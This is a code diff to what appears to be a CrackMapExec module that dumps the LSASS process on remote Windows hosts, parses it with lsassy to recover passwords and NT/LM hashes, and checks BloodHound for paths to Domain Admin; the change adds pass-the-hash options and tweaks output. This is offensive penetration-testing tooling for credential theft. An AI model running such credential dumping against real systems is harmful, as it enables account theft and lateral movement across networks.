@@ -143,14 +143,16 @@ class CMEModule:
         """
         domain_name = connection.domain
         username = connection.username
-        password = connection.password if connection.password is not None else connection.nthash
+        password = getattr(connection, "password", "")
+        lmhash = getattr(connection, "lmhash", "")
+        nthash = getattr(connection, "nthash", "")
         host = connection.host
 
         py_arg = "{}/{}:{}@{}:/{}{}".format(
             domain_name, username, password, host, self.share, os.path.join(self.tmp_dir, machine_name)
         ).replace("\\", "/")
 
-        command = r"lsassy -j {}".format(py_arg, self.procdump_path + machine_name)
+        command = r"lsassy -j --hashes {}:{} {}".format(lmhash, nthash, py_arg, self.procdump_path + machine_name)
 
         # Parsing lsass dump remotely
         context.log.info('Parsing dump file with lsassy')
@@ -164,7 +166,7 @@ class CMEModule:
             context.log.debug('----- lsassy output -----')
             context.log.debug('{}'.format(out))
             context.log.debug('-----   end output  -----')
-            all_credentials = self.process_credentials(context, connection, out)
+            self.process_credentials(context, connection, out)
 
         # Delete lsass dump
         try:
@@ -215,7 +217,7 @@ class CMEModule:
             password = ':'.join(h for h in [lmhash, nthash] if h is not None)
         output = "%s\\%s %s" % (domain.decode('utf-8'), username.decode('utf-8'), password.decode('utf-8'))
         if self.bloodhound and self.bloodhound_analysis(context, connection, username):
-            output += " [PATH TO DOMAIN ADMIN FOUND]"
+            output += " [{}PATH TO DA{}]".format('\033[91m', '\033[93m') # Red and back to yellow
         context.log.highlight(output)
 
     def set_as_owned(self, context, connection):
@@ -271,4 +273,4 @@ class CMEModule:
                     RETURN COUNT(p) AS pathNb
                     """.format(username))
         driver.close()
-        return result.value()[0] != "0"
+        return result.value()[0] > 0
